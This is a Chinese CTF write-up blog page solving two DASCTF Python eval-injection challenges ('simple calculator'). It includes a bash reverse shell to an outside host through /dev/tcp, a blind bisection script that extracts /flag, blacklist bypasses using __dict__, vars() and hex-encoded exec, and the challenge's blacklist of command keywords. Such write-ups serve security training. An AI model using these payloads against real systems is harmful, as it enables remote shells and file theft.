<!DOCTYPE HTML>
<html>

<head>
	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
	<link rel="shortcut icon" href="/img/logo_miccall.png">
	
			    <title>
    ico's Blog
    </title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="/css/mic_main.css" />
    <link rel="stylesheet" href="/css/dropdownMenu.css" />
    <meta name="keywords" content="miccall" />
    
    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	 
    <noscript>
        <link rel="stylesheet" href="/css/noscript.css" />
    </noscript>
    <style type="text/css">
        body:before {
          content: ' ';
          position: fixed;
          top: 0;
          background: url('/img/bg.jpg') center 0 no-repeat;
          right: 0;
          bottom: 0;
          left: 0;
          background-size: cover; 
        }
    </style>

			    
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.scrollex.min.js"></script>
    <script src="/js/jquery.scrolly.min.js"></script>
    <script src="/js/skel.min.js"></script>
    <script src="/js/util.js"></script>
    <script src="/js/main.js"></script>
	
<meta name="generator" content="Hexo 4.2.1"></head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css" />
<link rel="stylesheet" href="/css/typo.css" />
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="/" class="logo">MICCALL</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special" >
            <ul class="menu links" >
			<!-- Homepage  主页  --> 
			<li >
	            <a href="/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        <a class="category-link" href="/categories/buuctf/">buuctf</a></li><li><a class="category-link" href="/categories/dasctf/">dasctf</a></li><li><a class="category-link" href="/categories/knowledge/">knowledge</a></li><li><a class="category-link" href="/categories/xjpc-ctf/">xjpc-ctf</a></li><li><a class="category-link" href="/categories/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/">第五空间</a>
	                    </ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/about/" title="简历">
		                简历
		            </a>
		        </li>
		        
		        <li>
		            <a href="/group/" title="团队">
		                团队
		            </a>
		        </li>
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
                    
                    <li>
                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
                            <i class="icon fa fa-github"></i>
                        </a>
                    </li>
                    
                    <li>
                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
                            <i class="icon fa fa-500px"></i>
                        </a>
                    </li>
                    
			</ul>
</nav>

        <div id="main" >
            <div class ="post_page_title_img" style="height: 25rem;background-image: url(https://s1.ax1x.com/2020/07/11/UlXl24.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >简单的计算器</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <h1 id="DASCTF六月赛"><a href="#DASCTF六月赛" class="headerlink" title="DASCTF六月赛"></a>DASCTF六月赛</h1><h2 id="简单的计算器1"><a href="#简单的计算器1" class="headerlink" title="简单的计算器1"></a>简单的计算器1</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span>session
<span class="token keyword">from</span> config <span class="token keyword">import</span> black_list<span class="token punctuation">,</span>create
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## flag is in /flag try to get it</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> black_word <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
            <span class="token keyword">if</span> black_word <span class="token keyword">in</span> string<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"hack"</span>
        <span class="token keyword">return</span> string

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        input <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span>
        create_question <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>
        input_question <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'question'</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
        <span class="token keyword">if</span> input_question<span class="token operator">==</span>None<span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"Invalid session please try again!"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
        <span class="token keyword">if</span> filter<span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"hack"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"hack"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            calc_result <span class="token operator">=</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>eval<span class="token punctuation">(</span>input_question <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> calc_result <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> <span class="token string">"Congratulations"</span>
            <span class="token keyword">elif</span> calc_result <span class="token operator">==</span> <span class="token string">'False'</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> <span class="token string">"Error"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> <span class="token string">"Invalid"</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> <span class="token string">"Invalid"</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span>result<span class="token punctuation">,</span>question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        create_question <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
<p>代码审计，他有一个黑名单但我们不知道是什么，他有一个eval()返回三种结果，明显就是让我们通过eval来得flag，因为没有回显，所以就有两种思路，一种是反弹shell，第二种是盲注，第一种开始可以用，后来被ban了。</p>
<blockquote>
<p>反弹shell</p>
<p>经过简单的测试，<code>open().write()</code>和<code>os.system()</code>可以用，所以直接填上这个提交</p>
<pre><code>1,open(&#39;/tmp/c.sh&#39;,&#39;w&#39;).write(&#39;/bin/bash -i &gt; 
/dev/tcp/jeffz.cn/60090&gt;&amp;1&#39;),os.system(&#39;/bin/bash /tmp/c.sh&#39;)</code></pre><p>然后本地nc监听就能拿到shell</p>
</blockquote>
<blockquote>
<p>盲注</p>
<p>大意就是利用挨个读取flag的字符，通过eval()中前面是计算的值，后面是payload，and连接全部true会返回Congratulations。</p>
<pre><code>payload = f&quot; and bool(open(&#39;/flag&#39;).read()[{x}]&gt;chr({mid}))&quot;</code></pre><p>这里用的二分法。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">"http://183.129.189.60:10026/"</span>
sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
x<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    x <span class="token operator">+=</span> <span class="token number">1</span>
    low <span class="token operator">=</span> <span class="token number">8</span>
    high <span class="token operator">=</span> <span class="token number">130</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> f<span class="token string">" and bool(open('/flag').read()[{x}]>chr({mid}))"</span>
            r <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            html <span class="token operator">=</span> r<span class="token punctuation">.</span>text
            calc <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'h4>(.+?)=&lt;/h4'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>
            result <span class="token operator">=</span> str<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>calc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            inp <span class="token operator">=</span> result <span class="token operator">+</span> payload
            r <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"input"</span><span class="token punctuation">:</span>inp<span class="token punctuation">}</span><span class="token punctuation">)</span>
            html <span class="token operator">=</span> r<span class="token punctuation">.</span>text
            result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'h3>(.+?)&lt;/h3'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Congratulations'</span><span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">if</span> mid <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token comment" spellcheck="true">#print(mid)</span>
    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
</blockquote>
<h2 id="简单的计算器2"><a href="#简单的计算器2" class="headerlink" title="简单的计算器2"></a>简单的计算器2</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span>session
<span class="token keyword">from</span> config <span class="token keyword">import</span> black_list<span class="token punctuation">,</span>create
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## flag is in /flag try to get it</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> black_word <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
            <span class="token keyword">if</span> black_word <span class="token keyword">in</span> string<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"hack"</span>
        <span class="token keyword">return</span> string

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        input <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span>
        create_question <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>
        input_question <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'question'</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
        <span class="token keyword">if</span> input_question <span class="token operator">==</span> None<span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"Invalid session please tryagain!"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
        <span class="token keyword">if</span> filter<span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"hack"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"hack"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
        calc_str <span class="token operator">=</span> input_question <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>input<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            calc_result <span class="token operator">=</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>eval<span class="token punctuation">(</span>calc_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
            calc_result <span class="token operator">=</span> <span class="token string">"Invalid"</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span>calc_result<span class="token punctuation">,</span>question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        create_question <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>这个有回显，可以直接想办法读，但题1的<code>open().read()</code>里的read被ban了</p>
<p>这里可以利用<code>__class__</code>和<code>vars()</code>函数或者<code>__dict__</code>属性来实现绕过，这三个东西都没过滤，而且<code>vars()</code>和<code>__dict__</code>用起来是一样的效果</p>
<p>因为这里的read实际上是</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">xxx</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        xxx</code></pre>
<p>需要传入一个self给它，所以需要再输入一遍<code>open(&#39;/flag&#39;,&#39;r&#39;)</code></p>
<p>所以新的payload就出来了</p>
<pre><code>1,open(&#39;/flag&#39;,&#39;r&#39;).__class__.__dict__[&#39;re&#39;+&#39;ad&#39;](open(&#39;/flag&#39;,&#39;r&#39;))
1,vars(open(&#39;/flag&#39;,&#39;r&#39;).__class__)[&#39;re&#39;+&#39;ad&#39;](open(&#39;/flag&#39;,&#39;r&#39;))</code></pre><p>得到flag</p>
<p>其他方法：</p>
<p>黑名单</p>
<pre><code>black_list = [&#39;os&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;system&#39;,&#39;if&#39;,&#39;for&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;enter&#39;,&#39;%&#39;,&#39;or&#39;,&#39;ls&#39;,&#39;sys&#39;,&#39;globals&#39;,&#39;read&#39;,&#39;popen&#39;]</code></pre><p>没有过滤exec，但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell，这里用hex绕过对os.system的过滤。</p>
<pre><code>1,open(&#39;/tmp/c.sh&#39;,&#39;w&#39;).write(&#39;/bin/bash -i &gt; /dev/tcp/jeffz.cn/60090&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617368202f746d702f632e73682729&#39;).decode())</code></pre>
            </div>

            <!-- Post Comments -->
            
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #7EC0EE;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load" id="disqus_bt"> 
    <button class="disqus_click_btn">点击查看评论</button>
</div>

<!--
<script type="text/javascript">
$('.btn_click_load').click(function() {
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    document.getElementById('disqus_bt').style.display = "none";
});
</script>
-->
<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'https://cuony.github.io/2020/07/11/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A81/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'https://cuony.github.io/2020/07/11/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A81/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/javascript">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//http-miccall-tech.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a href="http://miccall.tech " target="_blank" rel="noopener" style="border-bottom: none;">miccall</a></li>
            </ul>
            
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
